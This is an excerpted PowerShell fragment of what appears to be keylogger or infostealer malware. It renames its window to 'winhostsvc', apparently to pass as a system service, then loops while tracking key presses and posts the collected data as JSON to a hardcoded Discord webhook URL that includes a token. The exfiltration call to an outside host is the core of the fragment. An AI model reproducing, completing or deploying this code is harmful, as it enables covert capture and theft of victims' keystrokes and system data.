...
if($hwnd -ne [System.IntPtr]::Zero){
    ...
    $Host.UI.RawUI.WindowTitle = 'winhostsvc'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'winhostsvc' })
...
While ($true){
  $keyPressed = $false
    try{
      ...
      Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1201044976302309436/l2hHnYa5Jjk1c1DgD76Jf6LWCAqKgB8mksRNZTrkp05ewwqLTAxWyLkhcjAkN8MkJ3RL" -Method Post -ContentType "application/json" -Body $jsonsys
